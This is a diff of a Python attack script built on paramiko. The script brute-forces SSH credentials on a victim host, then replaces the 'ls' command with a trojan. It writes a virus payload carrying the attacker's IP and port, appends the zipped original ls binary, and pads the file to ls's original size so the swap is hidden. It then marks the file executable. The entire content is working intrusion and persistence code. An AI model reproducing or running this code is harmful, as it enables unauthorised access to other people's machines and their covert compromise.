@@ -4,6 +4,7 @@ import paramiko
 import socket
 import time
 import sys
+import binascii
 
 def crack_ssh_passwd(victim_ip:str, username:str) -> paramiko.SSHClient:
     '''
@@ -45,39 +46,43 @@ def crack(target_ip:str, user:str, password:str) -> paramiko.SSHClient:
         return crack(target_ip, user, password)
     
 def infect_ls(client:paramiko.SSHClient, attacker_ip:str, attacker_port:str):
-    with open('virus.py', 'r') as f:
+    with open('virus', 'r') as f:
         virus_content = f.read()
-
-    # Create a file named virus and write the virus content to it
-    _stdin, stdout, stderr = client.exec_command('echo "' + virus_content + '" > virus')
+        
+    # Insert the attacker_ip and attacker_port into the virus_content
+    virus_content = virus_content.replace('server_host', f'\\\"{attacker_ip}\\\"')
+    virus_content = virus_content.replace('server_port', f'{attacker_port}')
     
     _stdin, stdout, stderr = client.exec_command("which ls")
     ls_path = stdout.read().decode().strip()
     _stdin, stdout, stderr = client.exec_command(f"ls -l {ls_path} | awk '{{print $5}}'")
     ls_size = stdout.read().decode().strip()
     
+    # Create a file named virus and write the virus content to it
+    client.exec_command('echo "' + virus_content + '" > /app/ls')
+    
     _stdin, stdout, stderr = client.exec_command(f"""
         zip -q new_ls {ls_path};
-        cat new_ls.zip >> virus;
+        cat new_ls.zip >> /app/ls;
         ls -l new_ls.zip | awk '{{print $5}}'
         rm -f new_ls.zip;
     """)
     
     new_ls_size = stdout.read().decode().strip()
-    _stdin, stdout, stderr = client.exec_command("ls -l virus | awk '{print $5}'")
+    _stdin, stdout, stderr = client.exec_command("ls -l /app/ls | awk '{print $5}'")
     virus_size = stdout.read().decode().strip()
     print(f"[*] ls size: {ls_size}")
     print(f"[*] new_ls.zip size: {new_ls_size}")
     print(f"[*] virus size: {virus_size}")
     
-    padding_size = int(ls_size) - int(new_ls_size) - int(virus_size) - 8
+    padding_size = int(ls_size) - int(virus_size) - 8
     
     print(f"[*] Padding size: {padding_size}")
 
-    _stdin, stdout, stderr = client.exec_command('dd if=/dev/zero bs=' + str(padding_size) + ' count=1 >> virus;')
+    _stdin, stdout, stderr = client.exec_command('dd if=/dev/zero bs=' + str(padding_size) + ' count=1 >> /app/ls;')
     _stdin, stdout, stderr = client.exec_command("""
-        echo -n "aabbccdd" >> virus;
-        chmod +x virus;
+        echo -n 'aabbccdd' | xxd -r -p >> /app/ls;
+        chmod +x /app/ls;
         """)
     print(f"[*] Victim Infected !")
     
